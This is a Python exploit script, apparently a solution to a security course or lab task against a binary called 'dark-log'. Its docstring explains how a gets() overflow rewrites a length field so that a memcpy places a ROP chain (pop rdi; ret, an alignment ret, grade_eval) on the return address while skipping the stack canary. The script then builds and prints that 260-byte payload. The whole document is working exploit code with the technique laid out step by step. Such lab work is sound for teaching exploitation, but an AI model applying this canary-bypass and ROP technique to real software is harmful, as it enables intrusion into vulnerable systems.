#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log (canary bypass).

input() copies 128 bytes from expression into logMsg + len:
    memcpy(logMsg + len, expression, sizeof(expression));

The struct layout in the frame (rbp = frame base) is:
    expression  rbp-0x120   (128 bytes)
    logMsg      rbp-0xa0    (128 bytes)
    len (int)   rbp-0x20    (offset 256 from expression)
    pad[8]      rbp-0x1c
    canary      rbp-0x8
    ret addr    rbp+8

len is overwritten by the gets() overflow, so we set len = 168 (0xa8) to
make the copy land on the return address (logMsg + 168 = rbp+8) without
ever touching the canary at rbp-0x8.

The first 128 bytes of our input are therefore a ROP chain that gets
written onto the return address and executes when input() returns:
    pop rdi; ret   (0x4018a3)  -> rdi = 4
    ret            (0x4018a4)  -> fix stack alignment
    grade_eval     (0x401677)
"""
import struct
import sys

pop_rdi_ret = 0x4018A3   # 5f c3  (second byte of `pop r15`)
ret = 0x4018A4           # c3
grade_eval = 0x401677
len_value = 168          # logMsg(rbp-0xa0) + len -> return address(rbp+8)

chain = b""
chain += struct.pack("<Q", pop_rdi_ret)
chain += struct.pack("<Q", 4)
chain += struct.pack("<Q", ret)
chain += struct.pack("<Q", grade_eval)

# 128 bytes expression (copied to the return address) + 128 bytes logMsg
# filler + 4 bytes len. Total 260 bytes, stopping short of the canary.
payload = chain + b"\x90" * (128 - len(chain)) + b"\x90" * 128 \
    + struct.pack("<I", len_value)

sys.stdout.buffer.write(payload + b"\n")
